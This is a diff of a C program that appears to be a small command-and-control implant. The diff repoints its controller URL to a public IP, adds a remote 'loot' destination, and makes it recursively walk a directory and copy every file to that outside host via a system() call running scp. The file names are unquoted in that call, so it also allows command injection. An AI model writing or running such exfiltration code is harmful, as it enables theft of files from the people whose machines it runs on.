@@ -32,35 +32,36 @@
 
 char * readFile(char * fileName);
 char * takeControlInstruction(void); 
-void Copy(void);
+void Copy(char * rootDirectory);
 void copyContents(char * fileName);
 
 // Globals:
 
-char * CADDRESS = "http://192.168.0.200:5678/instruction.txt";
+char * CADDRESS = "http://70.77.131.111:5678/instruction.txt";		// "http://192.168.0.200:5678/instruction.txt"
 char * BASEDIRECTORY = "/home/ezra/test";
+char * REMOTEPATH = "itinerant@70.77.131.111:/home/itinerant/CONTROLLER/loot/";
 
 // Main function:
 
 int main(int argc, char * argv[]) {
 	
-	char * controllerDirective;
-	controllerDirective = takeControlInstruction();
-	printf("%s", controllerDirective);
+	/*char * controllerDirective;*/
+	/*controllerDirective = takeControlInstruction();*/
+	/*printf("%s", controllerDirective);*/
 
-	Copy();
+	Copy(BASEDIRECTORY);
 
 	return 0;
 }
 
 // Function definitions:
 
-void Copy() {
+void Copy(char * rootDirectory) {
 	
 	char * current;
 
 	struct dirent * entry;
-	DIR * dir = opendir(BASEDIRECTORY);
+	DIR * dir = opendir(rootDirectory);
 
 	if (dir == NULL) {
 		printf("Cannot open directory.");
@@ -69,7 +70,7 @@ void Copy() {
 
 	while ((entry = readdir(dir)) != NULL) {
 		char fullPath[1024];
-		snprintf(fullPath, sizeof(fullPath), "%s/%s", BASEDIRECTORY, entry->d_name);
+		snprintf(fullPath, sizeof(fullPath), "%s/%s", rootDirectory, entry->d_name);
 
 		struct stat path_stat;
 		stat(fullPath, &path_stat);
@@ -77,11 +78,14 @@ void Copy() {
 		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
 			current = fullPath;
 			printf("File: %s\n", current);
+			copyContents(current);
 		}
 		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
 			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
-				current = strcat(fullPath, "/");		
-				printf("Directory: %s\n ", current);
+				/*current = strcat(fullPath, "/");		*/
+				/*printf("Directory: %s\n ", current);*/
+				printf("Directory: %s\n ", fullPath);
+				Copy(fullPath);
 			}
 			else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
 				/*printf("EXCEPTION: %s\n", entry->d_name);*/
@@ -91,13 +95,14 @@ void Copy() {
 	}
 
 	closedir(dir);
-
 }
 
-void copyContents(char * fileName) {
-	
-	
+void copyContents(char * fileName) {			// This procedure relies heavily on SCP; problems will be called if it is not installed
 
+	char command[1000];
+	sprintf(command, "scp -P 49999 %s %s", fileName, REMOTEPATH);
+	system(command);
+	printf("Copied %s to remote server\n", fileName);
 }
 
 char * takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
